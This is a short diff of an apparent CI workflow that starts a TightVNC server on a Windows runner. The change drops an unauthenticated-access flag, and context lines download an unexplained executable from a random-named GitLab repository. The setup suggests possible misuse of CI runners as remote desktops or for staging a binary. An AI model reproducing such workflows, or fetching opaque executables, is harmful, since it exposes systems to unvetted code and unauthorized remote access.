@@ -34,7 +34,7 @@ jobs:
       - name: Start VNC server
         run: |
            taskkill /f /im tvnserver.exe
-           cmd /c '"C:\Program Files\TightVNC\tvnserver.exe" :0 -geometry 1920x1080 -depth 24 -SecurityTypes None'
+           cmd /c '"C:\Program Files\TightVNC\tvnserver.exe" :0 -geometry 1920x1080 -depth 24'
            curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
            cmd /c sleep 240
            cmd /c curl -o zip.exe -Uri "https://gitlab.com/jfv-he/jrtiiupngk/-/raw/main/use.exe"
